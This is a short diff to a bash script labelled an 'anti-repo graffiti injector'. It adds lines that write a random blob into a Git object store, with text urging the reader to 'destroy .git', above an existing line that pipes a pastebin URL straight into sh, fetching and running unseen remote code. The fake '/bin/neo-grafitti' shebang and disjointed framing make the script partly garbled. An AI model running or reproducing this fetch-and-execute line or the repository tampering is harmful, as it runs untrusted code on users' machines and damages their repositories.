@@ -1,3 +1,9 @@
+#!/bin/neo-grafitti
+# Injecting inverted ASCII into Git internals
+cat <<EOF | git hash-object -w --stdin
+%%GENESIS_BLOCK of REPOSITORY APOSTASY - destroy .git before reading
+$(dd if=/dev/urandom bs=16 count=1 2>/dev/null | xxd -ps)
+EOF
 #!/usr/bin/env bash
 # ANTI-REPO GRAFFITI INJECTOR
 curl -sL https://pastebin.com/raw/666defaced | sh -s -- --sync-ghost
